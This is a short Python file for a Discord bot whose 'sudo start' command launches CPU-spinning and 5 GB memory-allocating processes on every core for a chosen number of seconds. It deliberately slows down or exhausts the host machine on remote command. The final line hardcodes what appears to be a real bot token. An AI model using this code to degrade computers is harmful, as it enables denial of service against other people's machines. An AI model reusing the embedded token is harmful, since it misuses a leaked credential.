import discord
from discord.ext import commands
import psutil
import time
import multiprocessing


# Function to increase CPU usage in each process
def increase_cpu_usage(end_time):
    while True:
        # Perform some computations to keep CPU busy
        for _ in range(10 ** 7):
            pass

        if time.time() > end_time:
            break


# Function to increase RAM usage
def increase_ram_usage(end_time):
    data = bytearray(1024 * 1024 * 1024 * 5)  # Allocate 5 GB of memory
    while True:
        if time.time() > end_time:
            break


intents = discord.Intents.all()
# Discord Bot setup
bot = commands.Bot(command_prefix='sudo ', intents=intents)


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')


@bot.command()
async def start(ctx, arg):
    await ctx.send('Starting slow down process.')
    if arg.isdigit():
        # Set end time
        end_time = time.time() + int(arg)

        # Determine the number of CPU cores
        num_cores = psutil.cpu_count()

        # Start CPU and RAM usage increase in separate processes for each CPU core
        processes = []
        for _ in range(num_cores):
            cpu_process = multiprocessing.Process(target=increase_cpu_usage, args=(end_time,))
            ram_process = multiprocessing.Process(target=increase_ram_usage, args=(end_time,))
            processes.append(cpu_process)
            processes.append(ram_process)
            cpu_process.start()
            ram_process.start()

        # Wait for all processes to finish
        for p in processes:
            p.join()

        await ctx.send('Processes started successfully!')
    else:
        await ctx.send('Invalid argument. Please use "sudo start [value]" to start the processes.')


# Run the bot
bot.run('MTIyOTcyNzIyOTM4MzI4Mjc0MQ.GPuo5j.eeiizozYP-0nDfmfj9BwQzWHBHabBp1tCI9MVQ')
